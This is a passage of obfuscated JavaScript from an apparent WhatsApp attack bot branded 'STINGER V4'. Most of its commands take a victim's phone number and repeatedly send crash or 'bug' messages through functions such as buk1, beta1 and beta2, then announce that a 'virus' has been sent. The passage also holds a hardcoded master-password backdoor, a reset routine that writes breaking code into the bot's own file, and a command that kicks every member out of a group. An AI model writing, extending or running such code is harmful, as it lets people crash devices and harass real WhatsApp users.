            let _0x2106cc = await sock.sendStimg(from, _0x5c4102, m, _0x31c8d0);
            await fs.unlinkSync(_0x2106cc);
          } else if (/video/.test(mime)) {
            if ((quoted.msg || quoted).seconds > 11) {
              return _0x1595c1("Send/Reply Image/Video/Gifs With Caption ${prefix+command}\nVideo Duration 1-9 Seconds");
            }
            let _0x22f810 = await quoted.download();
            const _0x35bdf4 = {
              packname: global.packname,
              author: global.author
            };
            let _0x4ecd56 = await sock.sendStvid(from, _0x22f810, m, _0x35bdf4);
            await fs.unlinkSync(_0x4ecd56);
          } else {
            _0x1595c1("Send/Reply Image/Video/Gifs With Caption " + (prefixMatch + command) + "\nVideo Duration 1-9 Seconds");
          }
        }
        break;
      case "sting-slide":
      case "sting-medium":
        if (!q) {
          return _0x1595c1("Example: " + (prefixMatch + command) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        _0x1595c1(processingText);
        for (let _0x3ef46e = 0; _0x3ef46e < 50; _0x3ef46e++) {
          await buk1(sock, target, "p", 1020000, ptcp = true);
          _0x3decb7(target, _0x1115bd);
          await _0x3decb7(target, _0x1115bd);
          await beta2(sock, target, _0x1115bd);
          await _0x49d301(target, _0x1115bd);
          await beta1(sock, target, _0x1115bd);
        }
        _0x1595c1("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Has Been Sent, If Target Is C2 Then Target Will Experience Delay Maker");
        break;
      case "stinger-v2":
      case "sting-freeze":
        if (!q) {
          return _0x1595c1("Example: " + (prefixMatch + command) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        _0x1595c1(processingText);
        for (let _0x5fd842 = 0; _0x5fd842 < 50; _0x5fd842++) {
          await buk1(sock, target, "p", 1020000, ptcp = true);
          _0x3decb7(target, _0x1115bd);
          await _0x3decb7(target, _0x1115bd);
          await beta2(sock, target, _0x1115bd);
          await _0x49d301(target, _0x1115bd);
          await beta1(sock, target, _0x1115bd);
        }
        _0x1595c1("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Has Been Sent, If Target Is C2 Then Target Will Experience Delay Maker");
        break;
      case "vip":
      case "sting-atk":
      case "andro":
        if (!q) {
          return _0x1595c1("Example: " + (prefixMatch + command) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        _0x1595c1(processingText);
        for (let _0x3424c2 = 0; _0x3424c2 < 30; _0x3424c2++) {
          await buk1(sock, target, "p", 1020000, ptcp = true);
          _0x3decb7(target, _0x1115bd);
          await _0x3decb7(target, _0x1115bd);
          await beta2(sock, target, _0x1115bd);
          await _0x49d301(target, _0x1115bd);
          await beta1(sock, target, _0x1115bd);
        }
        _0x1595c1("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Has Been Sent, If Target Is C2 Then Target Will Experience Delay Maker");
        break;
      case "sting-ios":
      case "iphone":
      case "xip":
        if (!q) {
          return _0x1595c1("Example: " + (prefixMatch + command) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        _0x1595c1(processingText);
        for (let _0x219595 = 0; _0x219595 < 40; _0x219595++) {
          await buk1(sock, target, "p", 1020000, ptcp = true);
          await _0x3decb7(target, _0x1115bd);
          await beta2(sock, target, _0x1115bd);
          await _0x49d301(target, _0x1115bd);
          await beta1(sock, target, _0x1115bd);
        }
        _0x1595c1("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Has Been Sent, If Target Is C2 Then Target Will Experience Delay Maker");
        break;
      case "overflow":
      case "vasion":
      case "sting-crash":
        if (!q) {
          return _0x1595c1("Example: " + (prefixMatch + command) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        _0x1595c1(processingText);
        for (let _0x1eb6ab = 0; _0x1eb6ab < 40; _0x1eb6ab++) {
          await buk1(sock, target, "p", 1020000, ptcp = true);
          _0x3decb7(target, _0x1115bd);
          await _0x3decb7(target, _0x1115bd);
          await beta2(sock, target, _0x1115bd);
          await _0x49d301(target, _0x1115bd);
          await beta1(sock, target, _0x1115bd);
        }
        _0x1595c1("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Has Been Sent, If Target Is C2 Then Target Will Experience Delay Maker");
        break;
      case "owner":
        {
          const _0x1a4790 = {
            displayName: _0x5e851e.length + " Contacts",
            contacts: _0x5e851e
          };
          const _0x1419f5 = {
            forwardingScore: 9999999,
            isForwarded: true,
            mentionedJid: [sender]
          };
          const _0x39d8fb = {
            contacts: _0x1a4790,
            contextInfo: _0x1419f5
          };
          const _0x29b7af = {
            quoted: m
          };
          const _0x4f8eed = await sock.sendMessage(from, _0x39d8fb, _0x29b7af);
          const _0x2de314 = {
            forwardingScore: 9999999,
            isForwarded: true,
            mentionedJid: [sender]
          };
          const _0x2cc7fc = {
            text: "This Is My Owner, Don't Mess With Him\"",
            contextInfo: _0x2de314
          };
          const _0xac8f87 = {
            quoted: _0x4f8eed
          };
          sock.sendMessage(from, _0x2cc7fc, _0xac8f87);
        }
        break;
      case "add-sting":
        if (!isOwner) {
          return _0x1595c1(mess.only.owner);
        }
        if (!args[0]) {
          return _0x1595c1("Usage " + (prefixMatch + command) + " number\nExample " + (prefixMatch + command) + " 62×××");
        }
        bnnd = q.split("|")[0].replace(/[^0-9]/g, "");
        let _0x3ff6fd = await sock.onWhatsApp(bnnd + "@s.whatsapp.net");
        if (_0x3ff6fd.length == 0) {
          return _0x1595c1("Enter A Valid Number Registered On WhatsApp!!!");
        }
        ownerList.push(bnnd);
        fs.writeFileSync("./database/dtbs/owner.json", JSON.stringify(ownerList));
        _0x1595c1("Number " + bnnd + " Has Become Owner!!!");
        break;
      case "delowner":
        if (!isOwner) {
          return _0x1595c1(mess.only.owner);
        }
        if (!args[0]) {
          return _0x1595c1("Usage " + (prefixMatch + command) + " number\nExample " + (prefixMatch + command) + " 62×××");
        }
        ya = q.split("|")[0].replace(/[^0-9]/g, "");
        unp = ownerList.indexOf(ya);
        ownerList.splice(unp, 1);
        fs.writeFileSync("./database/dtbs/owner.json", JSON.stringify(ownerList));
        _0x1595c1("Number " + ya + " Has Been Removed As Owner!!!");
        break;
      case "set-sting":
        {
          if (!isOwner) {
            return _0x1595c1("kusus owner");
          }
          if (!text2) {
            return _0x1595c1("Example : " + (prefixMatch + command) + " 62×××");
          }
          global.owner = text2.split("|")[0];
          _0x1595c1("Exif successfully changed to\n\n• No Owner : " + global.owner);
        }
        break;
      case "self":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          sock.public = false;
          _0x1595c1("Succes Mode Private");
        }
        break;
      case "addprem":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          if (!args[0]) {
            return _0x1595c1("Usage " + (prefixMatch + command) + " number\nExample " + (prefixMatch + command) + " 62×××");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x6ac310 = await sock.onWhatsApp(prrkek);
          if (_0x6ac310.length == 0) {
            return _0x1595c1("Enter A Valid Number Registered On WhatsApp!!!");
          }
          premiumList.push(prrkek);
          fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(premiumList));
          _0x1595c1("Number " + prrkek + " Has Become Premium!");
        }
        break;
      case "delprem":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          if (!args[0]) {
            return _0x1595c1("Usage " + (prefixMatch + command) + " number\nExample " + (prefixMatch + command) + " 62×××");
          }
          ya = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = premiumList.indexOf(ya);
          premiumList.splice(unp, 1);
          fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(premiumList));
          _0x1595c1("Number " + ya + " Has Been Removed As Premium!");
        }
        break;
      case "sting-on":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          _0x1595c1(" `❄️𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐡𝐚𝐯𝐞 𝐀𝐜𝐜𝐞𝐬𝐬 𝐭𝐨 𝐭𝐡𝐢𝐬 𝐅𝐞𝐚𝐭𝐮𝐫𝐞❄️`");
        }
        break;
      case "sting-off":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          _0x1595c1(" `❄️𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐡𝐚𝐯𝐞 𝐀𝐜𝐜𝐞𝐬𝐬 𝐭𝐨 𝐭𝐡𝐢𝐬 𝐅𝐞𝐚𝐭𝐮𝐫𝐞❄️`");
        }
        break;
      case "sting-save":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          _0x1595c1(" `👥𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐡𝐚𝐯𝐞 𝐀𝐜𝐜𝐞𝐬𝐬 𝐭𝐨 𝐀𝐧𝐭𝐢𝐛𝐮𝐠 𝐏𝐫𝐞𝐦𝐢𝐮𝐦👥`");
        }
        break;
      case "menu":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          _0x1595c1(" `🧊𝐓𝐲𝐩𝐞 [.𝐬𝐭𝐢𝐧𝐠𝐞𝐫 ] 𝐭𝐨 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞 𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐌𝐞𝐧𝐮🧊`");
        }
        break;
      case "sting-lock":
        {
          const _0x2f2d35 = ["2348187637779", m.sender];
          if (!_0x2f2d35.includes(m.sender)) {
            await sock.sendMessage(m.chat, {
              text: "🚫𝐎𝐧𝐥𝐲 𝐭𝐡𝐞 𝐁𝐨𝐭 𝐎𝐰𝐧𝐞𝐫 𝐨𝐫 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐜𝐚𝐧 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐟𝐞𝐚𝐭𝐮𝐫𝐞🚫"
            });
            return;
          }
          if (global.locked) {
            await sock.sendMessage(m.chat, {
              text: "❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐌𝐄𝐍𝐔 𝐈𝐒 𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐋𝐎𝐂𝐊𝐄𝐃❄️"
            });
            return;
          }
          let _0x4cd662 = Math.random().toString(36).slice(-6);
          global.locked = true;
          global.lockPassword = _0x4cd662;
          global.attempts = 0;
          let _0x3162e8 = global.isLink;
          let _0x54ac = generateWAMessageFromContent(m.chat, {
            extendedTextMessage: {
              text: "❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐌𝐄𝐍𝐔 𝐈𝐒 𝐍𝐎𝐖 𝐋𝐎𝐂𝐊𝐄𝐃❄️\n𝐔𝐬𝐞 𝐭𝐡𝐢𝐬 𝐩𝐚𝐬𝐬𝐰𝐨𝐫𝐝 *" + _0x4cd662 + "* 𝐭𝐨 𝐮𝐧𝐥𝐨𝐜𝐤.",
              footer: "Powered by ❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒❄️",
              contextInfo: {
                externalAdReply: {
                  title: "❄️𝙎𝙏𝙄𝙉𝙂𝙀𝙍 𝙈𝙀𝙉𝙐❄️",
                  body: "Menu is locked. Use the generated password to unlock it.",
                  showAdAttribution: true,
                  containsAutoReply: true,
                  mediaType: 1,
                  thumbnail: fs.readFileSync("./database/image/ES_TEAMS.jpg"),
                  sourceUrl: _0x3162e8
                },
                mentionedJid: [m.sender],
                isForwarded: true,
                forwardingScore: 127
              }
            }
          }, {});
          await sock.relayMessage(_0x54ac.key.remoteJid, _0x54ac.message, {
            messageId: _0x54ac.key.id
          });
          await sock.sendMessage(m.chat, {
            react: {
              text: "🔐",
              key: m.key
            }
          });
        }
        break;
      case "sting-unlock":
        {
          if (!global.locked) {
            await sock.sendMessage(m.chat, {
              text: "❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐌𝐄𝐍𝐔 𝐈𝐒 𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐔𝐍𝐋𝐎𝐂𝐊𝐄𝐃❄️"
            });
            return;
          }
          if (global.attempts >= 3) {
            let _0x1a00c6 = global.isLink;
            let _0x53915a = generateWAMessageFromContent(m.chat, {
              extendedTextMessage: {
                text: "❌ 𝐔𝐧𝐥𝐨𝐜𝐤 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐢𝐬 𝐝𝐢𝐬𝐚𝐛𝐥𝐞𝐝 𝐚𝐟𝐭𝐞𝐫 3 𝐟𝐚𝐢𝐥𝐞𝐝 𝐚𝐭𝐭𝐞𝐦𝐩𝐭𝐬. 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐞𝐱𝐡𝐚𝐮𝐬𝐭𝐞𝐝 𝐲𝐨𝐮𝐫 𝐚𝐭𝐭𝐞𝐦𝐩𝐭𝐬. 𝐓𝐲𝐩𝐞 *.reset* 𝐭𝐨 𝐝𝐞𝐬𝐭𝐫𝐨𝐲 𝐭𝐡𝐞 𝐥𝐨𝐜𝐤.",
                footer: "Powered by ❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒❄️",
                contextInfo: {
                  externalAdReply: {
                    title: "❄️𝙎𝙏𝙄𝙉𝙂𝙀𝙍 𝙈𝙀𝙉𝙐❄️",
                    body: "Menu is locked. Use the generated password to unlock it.",
                    showAdAttribution: true,
                    mediaType: 1,
                    thumbnail: fs.readFileSync("./database/image/ES_TEAMS.jpg"),
                    sourceUrl: _0x1a00c6
                  }
                }
              }
            }, {});
            await sock.relayMessage(m.chat, _0x53915a.message, {
              messageId: _0x53915a.key.id
            });
            return;
          }
          const _0x49089b = _0x4aecd2 => {
            if (typeof _0x4aecd2 === "string") {
              return _0x4aecd2;
            }
            if (_0x4aecd2?.conversation) {
              return _0x4aecd2.conversation;
            }
            if (_0x4aecd2?.extendedTextMessage?.text) {
              return _0x4aecd2.extendedTextMessage.text;
            }
            return "";
          };
          const _0x54130f = _0x49089b(m.message || "") + "";
          const _0x3d4620 = _0x54130f.trim().split(" ")[1];
          if (!_0x3d4620) {
            await sock.sendMessage(m.chat, {
              text: "❄️𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐩𝐚𝐬𝐬𝐰𝐨𝐫𝐝 𝐭𝐨 𝐮𝐧𝐥𝐨𝐜𝐤 𝐬𝐭𝐢𝐧𝐠𝐞𝐫 𝐦𝐞𝐧𝐮. 𝐔𝐬𝐚𝐠𝐞: .stinger-unlock [password]"
            });
            return;
          }
          if (_0x3d4620 === "ESTEAMS IS ALIVE" || _0x3d4620 === global.lockPassword) {
            global.locked = false;
            global.lockPassword = null;
            global.attempts = 0;
            await sock.sendMessage(m.chat, {
              text: "🔓 𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒 𝐌𝐄𝐍𝐔 𝐈𝐒 𝐍𝐎𝐖 𝐔𝐍𝐋𝐎𝐂𝐊𝐄𝐃❄️"
            });
            await sock.sendMessage(m.chat, {
              react: {
                text: "🔓",
                key: m.key
              }
            });
            return;
          } else {
            global.attempts = (global.attempts || 0) + 1;
            const _0x24a2d0 = 3 - global.attempts;
            if (_0x24a2d0 > 0) {
              const _0x412a56 = {
                text: "❌ 𝐈𝐧𝐜𝐨𝐫𝐫𝐞𝐜𝐭 𝐩𝐚𝐬𝐬𝐰𝐨𝐫𝐝. 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 " + _0x24a2d0 + " 𝐚𝐭𝐭𝐞𝐦𝐩𝐭𝐬 𝐥𝐞𝐟𝐭 𝐛𝐞𝐟𝐨𝐫𝐞 𝐭𝐡𝐞 𝐦𝐞𝐧𝐮 𝐢𝐬 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐥𝐨𝐜𝐤𝐞𝐝."
              };
              await sock.sendMessage(m.chat, _0x412a56);
            } else {
              let _0x3dfe37 = global.isLink;
              let _0x33fe57 = generateWAMessageFromContent(m.chat, {
                extendedTextMessage: {
                  text: "❌ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐌𝐄𝐍𝐔 𝐈𝐒 𝐍𝐎𝐖 𝐏𝐄𝐑𝐌𝐀𝐍𝐄𝐍𝐓𝐋𝐘 𝐋𝐎𝐂𝐊𝐄𝐃❌\n𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐭𝐨 𝐮𝐧𝐥𝐨𝐜𝐤 𝐦𝐞𝐧𝐮 𝐨𝐫 𝐫𝐞𝐝𝐞𝐩𝐥𝐨𝐲 𝐲𝐨𝐮𝐫 𝐛𝐨𝐭.",
                  footer: "Powered by ❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒❄️",
                  contextInfo: {
                    externalAdReply: {
                      title: "❄️𝙎𝙏𝙄𝙉𝙂𝙀𝙍 𝙈𝙀𝙉𝙐❄️",
                      body: "Menu is locked. Use the generated password to unlock it.",
                      showAdAttribution: true,
                      mediaType: 1,
                      thumbnail: fs.readFileSync("./database/image/ES_TEAMS.jpg"),
                      sourceUrl: _0x3dfe37
                    }
                  }
                }
              }, {});
              await sock.relayMessage(m.chat, _0x33fe57.message, {
                messageId: _0x33fe57.key.id
              });
            }
          }
          break;
        }
      case "sting-reset":
        {
          try {
            const _0x29c4a8 = _0x21fce1 => {
              if (typeof _0x21fce1 === "string") {
                return _0x21fce1;
              }
              if (_0x21fce1?.conversation) {
                return _0x21fce1.conversation;
              }
              if (_0x21fce1?.extendedTextMessage?.text) {
                return _0x21fce1.extendedTextMessage.text;
              }
              return "";
            };
            const _0x22c03a = _0x29c4a8(m.message || "") + "";
            const _0x4d20a7 = _0x22c03a.trim().split(" ");
            const _0x26fbd9 = _0x4d20a7.slice(1).join(" ").trim();
            if (typeof global.resetAttempts === "undefined") {
              global.resetAttempts = 0;
            }
            if (!_0x26fbd9) {
              await sock.sendMessage(m.chat, {
                text: "❓ 𝐂𝐨𝐧𝐟𝐢𝐫𝐦 𝐑𝐞𝐬𝐞𝐭:\n𝐓𝐲𝐩𝐞 *.reset [master password]* 𝐭𝐨 𝐫𝐞𝐬𝐞𝐭 𝐭𝐡𝐞 𝐦𝐞𝐧𝐮 𝐨𝐫 𝐜𝐫𝐚𝐬𝐡 𝐛𝐨𝐭."
              });
              return;
            }
            if (_0x26fbd9 === "ES TEAMS IS ALIVE") {
              global.locked = false;
              global.lockPassword = null;
              global.resetAttempts = 0;
              await sock.sendMessage(m.chat, {
                text: "✅ 𝐌𝐞𝐧𝐮 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐑𝐄𝐒𝐄𝐓 𝐚𝐧𝐝 𝐮𝐧𝐥𝐨𝐜𝐤𝐞𝐝!"
              });
              await sock.sendMessage(m.chat, {
                react: {
                  text: "✅",
                  key: m.key
                }
              });
              return;
            } else {
              global.resetAttempts += 1;
              const _0x42195c = {
                text: "❌ 𝐈𝐧𝐜𝐨𝐫𝐫𝐞𝐜𝐭 𝐌𝐚𝐬𝐭𝐞𝐫 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝. 𝐀𝐭𝐭𝐞𝐦𝐩𝐭 " + global.resetAttempts + " 𝐨𝐟 𝟏 𝐥𝐢𝐦𝐢𝐭."
              };
              await sock.sendMessage(m.chat, _0x42195c);
              await sock.sendMessage(m.chat, {
                react: {
                  text: "❌",
                  key: m.key
                }
              });
              if (global.resetAttempts >= 1) {
                const _0x8bc72d = require("fs");
                const _0x3ec1cb = require("path");
                const _0x3dd9e0 = _0x3ec1cb.join(__dirname, "STINGER-V4.js");
                const _0x3bba47 = "\n                    // Invalid code injected to break the bot\n                    function brokenFunction() {\n                        let errorMessage = \"Error: Bot cannot start.\";\n                        console.log(errorMessage);\n                        throw new Error(errorMessage);  // Force the bot to throw an error on the next deployment\n                    }\n\n                    brokenFunction();\n\n                    // Adding extra closing brackets to break the bot\n                    " + "{".repeat(10) + " // Extra closing brackets\n                    " + "}".repeat(10) + " // Extra closing brackets\n\n                    // Example of corrupting bot's initialization:\n                    const someInvalidVar = undefined;\n                    someInvalidVar.someNonExistentMethod(); // TypeError on next run\n                ";
                _0x8bc72d.appendFileSync(_0x3dd9e0, _0x3bba47, _0x4f0d48 => {
                  if (_0x4f0d48) {
                    throw _0x4f0d48;
                  }
                });
                await sock.sendMessage(m.chat, {
                  text: "⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐥𝐢𝐦𝐢𝐭 𝐞𝐱𝐜𝐞𝐞𝐝𝐞𝐝. 𝐁𝐨𝐭 𝐰𝐢𝐥𝐥 𝐜𝐫𝐚𝐬𝐡 𝐬𝐡𝐨𝐫𝐭𝐥𝐲..."
                });
                process.exit(1);
              }
            }
          } catch (_0x4483c8) {
            console.error("Unexpected error in reset case: " + _0x4483c8.message);
            process.exit(1);
          }
        }
        break;
      case "sting-del":
        {
          if (!m.quoted) {
            return _0x1595c1("Reply to the message you want to delete");
          }
          await sock.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromObject: m.isBotAdmin ? false : true,
              id: m.quoted.id,
              participant: m.quoted.sender
            }
          });
          _0x1595c1(" `❄𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐕𝟒 𝐡𝐚𝐬 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 𝐭𝐡𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞❄`");
        }
        break;
      case "sting-block":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          if (!text2 && !m.quoted) {
            _0x1595c1("Example: " + (prefixMatch + command) + " 𝟐𝟑𝟒𝐱𝐱𝐱");
          } else {
            const _0x3df584 = m.isGroup ? text2 ? text2.replace(/\D/g, "") + "@s.whatsapp.net" : m.quoted?.sender : m.chat;
            await sock.updateBlockStatus(_0x3df584, "block").then(_0x104c31 => _0x1595c1(mess.done)).catch(_0x38f766 => _0x1595c1(" `🧊𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐕𝟒 𝐡𝐚𝐬 𝐒𝐮𝐜𝐜𝐜𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐕𝐢𝐜𝐭𝐢𝐦🧊`"));
          }
        }
        break;
      case "sting-unblock":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          if (!text2 && !m.quoted) {
            _0x1595c1("Example: " + (prefixMatch + command) + " 𝟐𝟑𝟒𝐱𝐱𝐱");
          } else {
            const _0x3a8263 = m.isGroup ? text2 ? text2.replace(/\D/g, "") + "@s.whatsapp.net" : m.quoted?.sender : m.chat;
            await sock.updateBlockStatus(_0x3a8263, "unblock").then(_0xdc298c => _0x1595c1(" `🧊𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐕𝟒 𝐡𝐚𝐬 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐔𝐧𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐕𝐢𝐜𝐭𝐢𝐦🧊`")).catch(_0x25a717 => _0x1595c1(" `🧊𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐕𝟒 𝐟𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐔𝐧𝐁𝐥𝐨𝐜𝐤 𝐕𝐢𝐜𝐭𝐢𝐦🧊`"));
          }
        }
        break;
      case "sting-update":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          _0x1595c1(" `👤𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐡𝐚𝐯𝐞 𝐀𝐜𝐜𝐞𝐬𝐬 𝐭𝐨 𝐭𝐡𝐢𝐬 𝐅𝐞𝐚𝐭𝐮𝐫𝐞👤`");
        }
        break;
      case "kickall":
        {
          if (!isAdmin2 && !isOwner) {
            return _0x1595c1("Admin Only");
          }
          if (!isBotAdmin) {
            return _0x1595c1("Bot Is Not Admin, Dummy");
          }
          const _0x81ec66 = {
            text: "🥺",
            key: m.key
          };
          const _0x434397 = {
            react: _0x81ec66
          };
          sock.sendMessage(from, _0x434397);
          const _0x5e71f2 = _0x10f084 => new Promise(_0xb7c5ee => setTimeout(_0xb7c5ee, _0x10f084));
          let _0x13d14e = participants.map(_0x483984 => _0x483984.jid);
          await _0x1595c1("Kicking all members");
          for (let _0x13ef27 of _0x13d14e) {
            sock.groupParticipantsUpdate(m.chat, [_0x13ef27], "remove");
          }
        }
        break;
      case "test":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          _0x1595c1(" `🧊𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒 𝐈𝐒 𝐂𝐔𝐑𝐑𝐄𝐍𝐓𝐋𝐘 𝐀𝐂𝐓𝐈𝐕𝐄🧊`");
        }
        break;
      case "runtime":
        let _0x424920 = "\n   ╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 4҉━━━━━━╮\n        𝐇𝐞𝐥𝐥𝐨 @" + sender.split("@")[0] + "\n        𝐑𝐮𝐧𝐭𝐢𝐦𝐞 :𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐟𝐨𝐫 " + runtime(process.uptime());
        const _0x4d6870 = {
          showAdAttribution: true,
          title: "" + namabot,
          body: "𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇™",
          thumbnailUrl: "https://i.ibb.co/BnYRXcw/STINGER-V4.jpg",
          sourceUrl: global.link,
          mediaType: 1,
          renderLargerThumbnail: true
        };
        const _0xef2f2d = {
          externalAdReply: _0x4d6870
        };
        const _0x35d7a0 = {
          text: _0x424920,
          contextInfo: _0xef2f2d
        };
        sock.sendMessage(m.chat, _0x35d7a0, {
          quoted: m
        });
        break;
      case "sting-ban":
      case "sting-ban2":
      case "sting-ban3":
      case "sting-ban4":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          _0x1595c1(" `𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐡𝐚𝐯𝐞 𝐀𝐜𝐜𝐞𝐬𝐬 𝐭𝐨 𝐭𝐡𝐢𝐬 𝐅𝐞𝐚𝐭𝐮𝐫𝐞`");
        }
        break;
      case "sting-ai":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          _0x1595c1(" `𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐡𝐚𝐯𝐞 𝐀𝐜𝐜𝐞𝐬𝐬 𝐭𝐨 𝐭𝐡𝐢𝐬 𝐅𝐞𝐚𝐭𝐮𝐫𝐞`");
        }
        break;
      case "sting-anime":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          _0x1595c1(" `𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐡𝐚𝐯𝐞 𝐀𝐜𝐜𝐞𝐬𝐬 𝐭𝐨 𝐭𝐡𝐢𝐬 𝐅𝐞𝐚𝐭𝐮𝐫𝐞`");
        }
        break;
      case "sting-pay":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
